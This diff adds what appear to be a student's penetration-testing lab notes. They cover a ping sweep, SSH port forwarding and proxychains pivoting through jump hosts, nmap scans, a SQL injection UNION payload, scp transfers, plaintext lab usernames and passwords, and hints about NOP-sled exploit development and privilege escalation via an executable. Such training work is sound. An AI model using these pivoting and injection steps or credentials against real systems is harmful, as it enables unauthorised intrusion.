@@ -1,1 +1,55 @@
+==========================================
+for i in {1..254}; do (ping -c 1 192.168.28.$i | grep "bytes from" &); done
+ssh -S /tmp/jump jump -O forward -D 9050
+proxychains nc 192.168.28.100 80
+ssh -S /tmp/jump jump -O forward -L 1111:192.168.28.100:80 -L 2222:192.168.100:2222 -L 3333:192.168.28:111 -L 5555:192.168.28.111:2222
+ssh -MS /tmp/t1 creds@127.0.0.1 -p 2222
+ssh -S /tmp/t1 t1 -O forward 9050
+proxychains nmap --script=http-enum.nse 192.168.28.100
+UNION SELECT table_schema,table_name,column_name from information_schema.columns #
+nmap -Pn -sT -T4
 
+
+=========================================
+
+-L2222
+192.168.28.177
+
+ssh Fpalic@127.0.0.1 -p 2222
+Birdperson 
+
+Fpalic:x:1001:1001::/home/Fpalic:/bin/sh
+
+scp -P 1212 student@127.0.0.1:home/student2/Documents/script.sh .
+/home/devops
+
+10.50.23.247 -- windows -- 192.168.65.10
+
+scp -P 1212 file.sh student@127.0.0.1:C:/users/student/desktop
+
+Msmith  Squanchy 
+ Fpalic Birdperson  
+Kmichae  MrMeeseeks 
+Rsanch ScaryTerry
+
+openupthedoor :: B12c3b34f
+openupthedoor:x:1001:1001::/home/openupthedoor:/bin/bash
+had a dot in the path 
+192.168.28.0/27
+
+One system on the internal network might have GDB installed
+
+It has recently been discovered that python3 adds additional characters to NOP sled, 
+DEVOPs recommends that python2.7 
+might be a better option in exploit development operations.
+
+Dev shop has created a Windows program which will create the following account: 
+hack :: pass123 
+if a area can be identified to have the exe run at a higher priv level.
+
+Resources:
+moveup.exe
+
+credentialDump.csv
+
+netmap.png
